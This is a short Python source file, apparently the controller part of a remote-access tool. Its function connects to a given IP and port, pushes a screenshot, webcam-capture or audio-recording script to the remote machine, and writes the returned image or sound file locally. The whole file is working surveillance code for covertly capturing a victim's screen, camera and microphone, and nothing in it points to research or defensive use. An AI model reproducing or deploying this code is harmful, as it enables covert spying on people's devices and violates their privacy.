from termcolor import colored
import socket

def execonremote(ip,port,action):

	sock = socket.socket()
	sock.connect((ip,port))

#	print ("Transfering script to remote")

	if action == 'screenshot':
		filename = 'cscreenshot.py'
	elif action == 'camcapture':
		filename = 'camcapture.py'
	elif action == 'audio':
		filename = 'recordaudio.py'

	file = open(filename,'rb')
	line = file.read(1024)

	while(line):
#		print (line.decode())
		sock.send(line)
		line = file.read(1024)

	file.close()

	sock.send("EOF".encode())

#	print ("Script sent! Waiting for return file .....")

	line = sock.recv(1024)

	if len(line) > 2:
		if action == 'screenshot':
			outputfile = 'ss_server.jpg'
		elif action == 'camcapture':
			outputfile = 'camera_server.jpg'
		elif action == 'audio':
			outputfile = 'mic_record.wav'

		file = open(outputfile,'wb')
		while(line):
			file.write(line)
			line = sock.recv(1024)

		file.close()

		print (colored(f'\nFile received successfully!\n','green'))

	else:
		print (colored(f'\nFailed to receive file\n','red'))

	sock.close()

#	print ("Connection Closed")
